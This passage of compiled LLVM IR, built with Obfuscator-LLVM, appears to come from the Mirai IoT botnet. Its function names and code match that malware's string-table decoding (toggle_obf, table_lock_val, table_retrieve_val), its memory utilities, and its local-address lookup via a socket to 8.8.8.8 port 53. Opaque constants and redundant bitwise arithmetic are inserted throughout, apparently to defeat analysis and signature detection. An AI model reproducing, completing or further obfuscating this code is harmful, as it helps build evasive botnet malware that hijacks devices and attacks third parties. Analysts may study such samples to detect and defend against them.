  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 255, -1
  %14 = xor i32 %12, %13
  %15 = and i32 %14, %12
  %16 = and i32 %12, 255
  %17 = trunc i32 %15 to i8
  store i8 %17, i8* %5, align 1
  %18 = load i32, i32* @table_key, align 4
  %19 = lshr i32 %18, 8
  %20 = xor i32 255, -1
  %21 = xor i32 %19, %20
  %22 = and i32 %21, %19
  %23 = and i32 %19, 255
  %24 = trunc i32 %22 to i8
  store i8 %24, i8* %6, align 1
  %25 = load i32, i32* @table_key, align 4
  %26 = lshr i32 %25, 16
  %27 = xor i32 %26, -1
  %28 = xor i32 255, -1
  %29 = xor i32 -1682131572, -1
  %30 = or i32 %27, %28
  %31 = or i32 -1682131572, %29
  %32 = xor i32 %30, -1
  %33 = and i32 %32, %31
  %34 = and i32 %26, 255
  %35 = trunc i32 %33 to i8
  store i8 %35, i8* %7, align 1
  %36 = load i32, i32* @table_key, align 4
  %37 = lshr i32 %36, 24
  %38 = xor i32 255, -1
  %39 = xor i32 %37, %38
  %40 = and i32 %39, %37
  %41 = and i32 %37, 255
  %42 = trunc i32 %40 to i8
  store i8 %42, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %134, %1
  %44 = load i32, i32* %3, align 4
  %45 = load %struct.table_value*, %struct.table_value** %4, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 1
  %47 = load i16, i16* %46, align 8
  %48 = zext i16 %47 to i32
  %49 = icmp slt i32 %44, %48
  br i1 %49, label %50, label %140

; <label>:50:                                     ; preds = %43
  %51 = load i8, i8* %5, align 1
  %52 = zext i8 %51 to i32
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = xor i32 %60, -1
  %62 = and i32 1362407165, %61
  %63 = xor i32 1362407165, -1
  %64 = and i32 %60, %63
  %65 = xor i32 %52, -1
  %66 = and i32 %65, 1362407165
  %67 = and i32 %52, %63
  %68 = or i32 %62, %64
  %69 = or i32 %66, %67
  %70 = xor i32 %68, %69
  %71 = xor i32 %60, %52
  %72 = trunc i32 %70 to i8
  store i8 %72, i8* %58, align 1
  %73 = load i8, i8* %6, align 1
  %74 = zext i8 %73 to i32
  %75 = load %struct.table_value*, %struct.table_value** %4, align 8
  %76 = getelementptr inbounds %struct.table_value, %struct.table_value* %75, i32 0, i32 0
  %77 = load i8*, i8** %76, align 8
  %78 = load i32, i32* %3, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = load i8, i8* %80, align 1
  %82 = sext i8 %81 to i32
  %83 = xor i32 %82, -1
  %84 = and i32 %74, %83
  %85 = xor i32 %74, -1
  %86 = and i32 %82, %85
  %87 = or i32 %84, %86
  %88 = xor i32 %82, %74
  %89 = trunc i32 %87 to i8
  store i8 %89, i8* %80, align 1
  %90 = load i8, i8* %7, align 1
  %91 = zext i8 %90 to i32
  %92 = load %struct.table_value*, %struct.table_value** %4, align 8
  %93 = getelementptr inbounds %struct.table_value, %struct.table_value* %92, i32 0, i32 0
  %94 = load i8*, i8** %93, align 8
  %95 = load i32, i32* %3, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = sext i8 %98 to i32
  %100 = xor i32 %99, -1
  %101 = and i32 -654128330, %100
  %102 = xor i32 -654128330, -1
  %103 = and i32 %99, %102
  %104 = xor i32 %91, -1
  %105 = and i32 %104, -654128330
  %106 = and i32 %91, %102
  %107 = or i32 %101, %103
  %108 = or i32 %105, %106
  %109 = xor i32 %107, %108
  %110 = xor i32 %99, %91
  %111 = trunc i32 %109 to i8
  store i8 %111, i8* %97, align 1
  %112 = load i8, i8* %8, align 1
  %113 = zext i8 %112 to i32
  %114 = load %struct.table_value*, %struct.table_value** %4, align 8
  %115 = getelementptr inbounds %struct.table_value, %struct.table_value* %114, i32 0, i32 0
  %116 = load i8*, i8** %115, align 8
  %117 = load i32, i32* %3, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %116, i64 %118
  %120 = load i8, i8* %119, align 1
  %121 = sext i8 %120 to i32
  %122 = xor i32 %121, -1
  %123 = and i32 -409544658, %122
  %124 = xor i32 -409544658, -1
  %125 = and i32 %121, %124
  %126 = xor i32 %113, -1
  %127 = and i32 %126, -409544658
  %128 = and i32 %113, %124
  %129 = or i32 %123, %125
  %130 = or i32 %127, %128
  %131 = xor i32 %129, %130
  %132 = xor i32 %121, %113
  %133 = trunc i32 %131 to i8
  store i8 %133, i8* %119, align 1
  br label %134

; <label>:134:                                    ; preds = %50
  %135 = load i32, i32* %3, align 4
  %136 = add i32 %135, 1950125011
  %137 = add i32 %136, 1
  %138 = sub i32 %137, 1950125011
  %139 = add nsw i32 %135, 1
  store i32 %138, i32* %3, align 4
  br label %43

; <label>:140:                                    ; preds = %43
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strlen(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

; <label>:4:                                      ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %16

; <label>:10:                                     ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add i32 %11, -2083458232
  %13 = add i32 %12, 1
  %14 = sub i32 %13, -2083458232
  %15 = add nsw i32 %11, 1
  store i32 %14, i32* %3, align 4
  br label %4

; <label>:16:                                     ; preds = %4
  %17 = load i32, i32* %3, align 4
  ret i32 %17
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_strcpy(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = sub i32 0, 1
  %12 = sub i32 %10, %11
  %13 = add nsw i32 %10, 1
  call void @util_memcpy(i8* %8, i8* %9, i32 %12)
  %14 = load i32, i32* %5, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind uwtable
define void @util_memcpy(i8*, i8*, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

; <label>:11:                                     ; preds = %18, %3
  %12 = load i32, i32* %6, align 4
  %13 = add i32 %12, 1764427853
  %14 = add i32 %13, -1
  %15 = sub i32 %14, 1764427853
  %16 = add nsw i32 %12, -1
  store i32 %15, i32* %6, align 4
  %17 = icmp ne i32 %12, 0
  br i1 %17, label %18, label %24

; <label>:18:                                     ; preds = %11
  %19 = load i8*, i8** %8, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %8, align 8
  %21 = load i8, i8* %19, align 1
  %22 = load i8*, i8** %7, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %7, align 8
  store i8 %21, i8* %22, align 1
  br label %11

; <label>:24:                                     ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @util_zero(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

; <label>:7:                                      ; preds = %13, %2
  %8 = load i32, i32* %4, align 4
  %9 = sub i32 0, -1
  %10 = sub i32 %8, %9
  %11 = add nsw i32 %8, -1
  store i32 %10, i32* %4, align 4
  %12 = icmp ne i32 %8, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %7
  %14 = load i8*, i8** %5, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %5, align 8
  store i8 0, i8* %14, align 1
  br label %7

; <label>:16:                                     ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_local_addr() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %2, align 4
  store i32 16, i32* %4, align 4
  %7 = call i32* @__errno_location() #9
  store i32 0, i32* %7, align 4
  %8 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %8, i32* %2, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %35

; <label>:11:                                     ; preds = %0
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = call i32 @htonl(i32 134744072) #9
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %15 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i32 %13, i32* %15, align 4
  %16 = call zeroext i16 @htons(i16 zeroext 53) #9
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = load i32, i32* %2, align 4
  %19 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %20 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %20, %struct.sockaddr** %19, align 8
  %21 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %22 = load %struct.sockaddr*, %struct.sockaddr** %21, align 8
  %23 = call i32 @connect(i32 %18, %struct.sockaddr* %22, i32 16)
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %union.__CONST_SOCKADDR_ARG* %6 to %struct.sockaddr**
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %26, %struct.sockaddr** %25, align 8
  %27 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %6, i32 0, i32 0
  %28 = load %struct.sockaddr*, %struct.sockaddr** %27, align 8
  %29 = call i32 @getsockname(i32 %24, %struct.sockaddr* %28, i32* %4) #6
  %30 = load i32, i32* %2, align 4
  %31 = call i32 @close(i32 %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %33 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  store i32 %34, i32* %1, align 4
  br label %35

; <label>:35:                                     ; preds = %11, %10
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #2

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146836174}
!2 = !{i32 -2146835765}
!3 = !{i32 -2146836302}
!4 = !{i32 -2146835893}
